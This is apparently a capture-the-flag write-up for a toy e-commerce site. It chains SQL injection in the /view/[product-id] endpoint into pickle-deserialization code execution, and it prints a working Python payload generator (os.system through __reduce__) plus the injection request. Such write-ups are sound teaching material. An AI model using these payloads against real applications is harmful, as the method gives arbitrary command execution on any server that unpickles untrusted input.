the main page looks like a simple e-commerce website with 4 products

it is possible to visualize individual products in the /view/[product-id] endpoint, the source code also tells that this parameter is sql injectable

	1' or id='4 \\ returns 200 ok http code

items are stored in the database as pickle objects, based on this it is interesting to check for **pickle deserialization** vulnerabilities 

remote code execution is available through a proper crafted payload injected into *product-id* parameter, it will then be processed through the application logic and executed when loaded into *pickle.loads(base64.b64decode(s))* [app.py source code]

python code to generate malicious object:

	import pickle
	from base64 import b64encode, b64decode
	
	payload = 'cp flag.txt application/static/images' \\\\copying flag.txt to publicly accessible directory
	
	class exploit:
	   def __reduce__(self):
	        import os
	        return os.system,(payload,)
	
	def send_payload():
		payload = exploit()
		payload = b64encode(pickle.dumps(payload))
		print(payload)
	
	if __name__ == '__main__':
		send_payload()

then a request injecting the output of the script to the /view/[product-id] endpoint would make the flag.txt accessible from the static/images/ directory

	/view/1' UNION SELECT '[PAYLOAD]




